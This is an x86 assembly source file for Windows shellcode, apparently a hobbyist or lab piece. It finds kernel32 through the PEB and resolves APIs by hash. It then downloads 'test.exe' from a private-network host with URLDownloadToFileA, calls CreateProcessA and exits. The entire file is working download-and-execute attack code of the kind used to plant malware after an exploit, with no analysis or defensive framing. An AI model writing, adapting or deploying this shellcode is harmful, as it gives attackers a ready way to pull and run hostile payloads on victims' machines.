.386
.model flat,stdcall 
assume FS:nothing 

.data

.code

start:


jmp short startup

; Find the base address of kernel32 :) ph33r
find_kernel32:

    xor     ecx, ecx                   ; ECX = 0
    mov     esi, [fs:30h]			   ; ESI = &(PEB) ([FS:0x30])
    mov     esi, [esi + 0ch]           ; ESI = PEB->Ldr
    mov     esi, [esi + 1ch]           ; ESI = PEB->Ldr.InInitOrder
next_module:
    mov     ebx, [esi + 08h]           ; EBP = InInitOrder[X].base_address
    mov     edi, [esi + 20h]           ; EBP = InInitOrder[X].module_name (unicode)
    mov     esi, [esi]                 ; ESI = InInitOrder[X].flink (next module)
    cmp     [edi + 12*2], cl           ; if (modulename[12] == 0)
    jne     next_module                ; No: try harder.
	ret

; Lets find some functions <3
find_function:
	pushad								; Save all registers
	mov   ebp, [esp + 24h]				; Store the base address in eax
	mov   eax, [ebp + 3ch]				; PE header VMA
	mov   edx, [ebp + eax + 78h]		; Export table relative offset
	add   edx, ebp						; Export table VMA
	mov   ecx, [edx + 18h]				; Number of names
	mov   ebx, [edx + 20h]				; Names table relative offset
	add   ebx, ebp						; Names table VMA

find_function_loop:
	jecxz find_function_finished		; Jump to the end if ecx is 0
	dec   ecx							; Decrement our names counter
	mov   esi, [ebx + ecx * 4]			; Store the relative offset of the name
	add   esi, ebp						; Set esi to the VMA of the current name

; Get the hashes for the API's :)
compute_hash:
	xor   edi, edi						; Zero edi
	xor   eax, eax						; Zero eax
	cld									; Clear direction

compute_hash_again:
	lodsb								; Load the next byte from esi into al
	test  al, al						; Test ourselves.
	jz    compute_hash_finished			; If the ZF is set, we've hit the null term.
	ror   edi, 0dh						; Rotate edi 13 bits to the right
	add   edi, eax						; Add the new byte to the accumulator
	jmp   compute_hash_again			; Next iteration

compute_hash_finished: 
find_function_compare:           
	cmp   edi, [esp + 28h]				; Compare the computed hash with the requested hash
	jnz   find_function_loop			; No match, try the next one.
	mov   ebx, [edx + 24h]				; Ordinals table relative offset
	add   ebx, ebp						; Ordinals table VMA
	mov   cx, [ebx + 2 * ecx]			; Extrapolate the function's ordinal
	mov   ebx, [edx + 1ch]				; Address table relative offset
	add   ebx, ebp						; Address table VMA
	mov   eax, [ebx + 4 * ecx]			; Extract the relative function offset from its ordinal
	add   eax, ebp						; Function VMA
	mov   [esp + 1ch], eax				; Overwrite stack version of eax from pushad

find_function_finished:
	popad								; Restore all registers
	ret

; We are done with the basic stuff :)
; Download part starts over here

begin:
	call find_kernel32					; Base address is in EBX
	pop edi								; Get the address of our shellcode
	sub edi, get_urlmon - urldata		; Offset until URL :)
	jmp short get_urlmon

startup:
	call begin

get_urlmon:
	push 0ec0e4e8eh						; LoadLibraryA hash
	push ebx							; kernel32 base address
	call find_function					; find address

	; LoadLibraryA (LPCTSTR lpLibFileName)
	xor ecx, ecx						; ecx = 0
	mov cx, 6e6fh						; Move "on" in cx register, lower two bytes of ecx
	push ecx							; Push null-terminated "on" to stack ("on" + \x0\x0)
	push 6d6c7275h						; Push "urlm", null terminated "urlmon" on stack
	push esp							; lpLibFileName for LoadLibrary
	call eax							; LoadLibraryA()

download: 
	push  0702f1a36h					; URLDownloadToFileA hash
	push eax							; Base of urlmon.dll
	call find_function					; find it :)

	;URLDownloadToFileA (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB)
	xor ecx, ecx						; Last 2 parameters should be 0
	push ecx							; lpfnCB
	push ecx							; dwReserved
	lea esi, [edi]						; Put URL in edx so we can do some crazy fu and get the destination path
	add esi, path - urldata
	push esi
	push edi
	push ecx							; pCaller
	call eax							; Call URLDownloadToFileA

create_proc: 
      push 016b3fe72h                                 ; CreateProcessA hash
      push ebx                                        ; Kernel32 Base
      call find_function                              ; find it!
      mov esi, eax                                    ; Save this function address to ESI
	xor eax, ebp                                    ; Adjust EAX to start the structure creation
      mov dword ptr ss:[ebp-04h], eax                 ; -||-
      lea eax, dword ptr ss:[ebp-4ch]                 ; -||-
      xor ecx, ecx                                    ; 0 out ecx for the parameters & struct

zero_memory:                                          ; ZeroMemory(&PROCESS_INFORMATION, sizeof(PROCESS_INFORMATION));
      mov byte ptr ds:[eax], 00h                      ; Fill 44 bytes with 00's
      inc ecx
      inc eax
      cmp ecx, 44h                                    ; Are we done ?
      jnz zero_memory                                 ; Nah
      add esp, 0ch                                    
      mov dword ptr ss:[ebp-4ch], 44h                 ; Put 0x00000044 there <3
      lea eax, dword ptr ss:[ebp-64h]                 ; Adjust EAX to start second structure creation
      xor ecx, ecx                                    ; 0 out ecx for the parameters & struc 

zero_memory_s:                                        ; ZeroMemory(&STARTUPINFO, sizeof(STARTUPINFO));
      mov byte ptr ds:[eax], 00h                      ; Fill 10 bytes with 00's
      inc ecx
      inc eax
      cmp ecx, 10h                                    ; Are we done ?
      jnz zero_memory_s                               ; Nah
      add esp, 0ch                                      

      xor ecx, ecx                                    ; 0 out ecx for the parameters & struct 
      
      sub eax, 10h                                    ; Adjust EAX to point at PROCESS_INFORMATION
      push	eax                                       ; lpProcessInformation
      mov ebp, eax                                    
      add ebp, 18h                                    ; Adjust EBP to point at STARTUPINFO
	push	ebp                                       ; lpStartupInfo
	push	ecx                                       ; lpCurrentDirectory
	push	ecx                                       ; lpEnvironment
	push	ecx                                       ; dwCreationFlags
	push	ecx                                       ; bInheritHandles
	push	ecx                                       ; lpThreadAttributes
	push	ecx                                       ; lpProcessAttributes
	mov edx, edi                                    ; EDI = Points to the beginning of our vars :)
      add edx, process - urldata                      ; Move process name into EDX
      push edx                                        ; lpCommandLine
	push	ecx                                       ; lpApplicationName
	call	esi                                       ; CreateProcessA

exit:
	push 073e2d87eh						; ExitProcess hash
	push ebx							; kernel32 base address
	call find_function					; find address

	; ExitProcess (UINT uExitCode)
	call eax							; holds our function address

urldata:
	db "http://192.168.108.136/test.exe", 0	; Define URL here :)

path:
	db "C:\Users\sickness\Desktop\a.vbs", 0 

process:
      db "C:\Windows\Notepad.exe", 0

end start

END
